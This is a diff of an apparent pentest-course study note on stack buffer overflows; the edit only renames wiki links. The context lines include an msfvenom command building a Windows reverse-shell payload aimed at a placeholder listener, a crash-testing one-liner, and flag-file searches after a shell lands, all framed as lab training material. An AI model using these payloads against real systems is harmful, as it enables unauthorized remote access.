@@ -1,6 +1,6 @@
 # Buffer Overflow & Memory Corruption, Command Appendix
 
-Part of [[COMMAND APPENDIX]]. Stack-based buffer overflow exploitation: shellcode generation, offset discovery, and useful commands once a BOF payload lands a shell. For adapting the surrounding exploit code itself (cross-compiling, running the binary), see [[Fixing Exploits]].
+Part of [[COMMAND APPENDIX]]. Stack-based buffer overflow exploitation: shellcode generation, offset discovery, and useful commands once a BOF payload lands a shell. For adapting the surrounding exploit code itself (cross-compiling, running the binary), see [[14. Fixing Exploits|Fixing Exploits]].
 
 ---
 
@@ -27,7 +27,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread \
 
 *Keep any NOP sled (`\x90` repeated) the surrounding exploit code adds **around** this shellcode, not inside it, msfvenom's output is just the payload itself.*
 
-See [[Fixing Exploits#14.1.4. Fixing the Exploit|14.1.4]] (C-embedded) and [[Fixing Exploits#Module Exercise VM #3: Unknown service, memory corruption|Module Exercise VM #3]] (raw-to-file).
+See [[14. Fixing Exploits#14.1.4. Fixing the Exploit|14.1.4]] (C-embedded) and [[14. Fixing Exploits#Module Exercise VM #3: Unknown service, memory corruption|Module Exercise VM #3]] (raw-to-file).
 
 #### Tags: #Msfvenom #ShellcodeGeneration #BadCharacters #StagedVsStageless #ShikataGaNai
 
@@ -42,7 +42,7 @@ python3 -c 'print("A"*3000)'   # feed into the vulnerable parameter, watch for a
 # A' in hex is \x41, if the overflow reaches the return address/EIP,
 # the debugger will show EIP holding exactly 0x41414141
 ```
-*A full offset-discovery workflow (Metasploit's `pattern_create.rb`/`pattern_offset.rb`, or Immunity Debugger + `mona.py`) needs a local debugger attached to the actual vulnerable process, this vault hasn't done that hands-on yet (both BOF case studies in [[Fixing Exploits]] reused already-researched offsets/addresses from existing public exploits rather than deriving them from scratch). See the HackTricks link in [[Fixing Exploits#14.3. Wrapping Up|14.3]] for the full derivation workflow once that's needed.*
+*A full offset-discovery workflow (Metasploit's `pattern_create.rb`/`pattern_offset.rb`, or Immunity Debugger + `mona.py`) needs a local debugger attached to the actual vulnerable process, this vault hasn't done that hands-on yet (both BOF case studies in [[14. Fixing Exploits|Fixing Exploits]] reused already-researched offsets/addresses from existing public exploits rather than deriving them from scratch). See the HackTricks link in [[14. Fixing Exploits#14.3. Wrapping Up|14.3]] for the full derivation workflow once that's needed.*
 
 #### Tags: #OffsetDiscovery #CrashTesting #PatternCreate #Mona
 
@@ -56,7 +56,7 @@ dir /s /b C:\*flag*
 ```
 *`/s` recurses into subdirectories, `/b` gives bare output (just paths, no headers/summary), useful for `whoami`-style shells with no GUI to browse in, same job as `find / -iname "*flag*" 2>/dev/null` on Linux.*
 
-See [[Fixing Exploits#Module Exercise VM #3: Unknown service, memory corruption|Module Exercise VM #3]].
+See [[14. Fixing Exploits#Module Exercise VM #3: Unknown service, memory corruption|Module Exercise VM #3]].
 
 #### Tags: #WindowsCMD #RecursiveSearch #PostExploitation
 
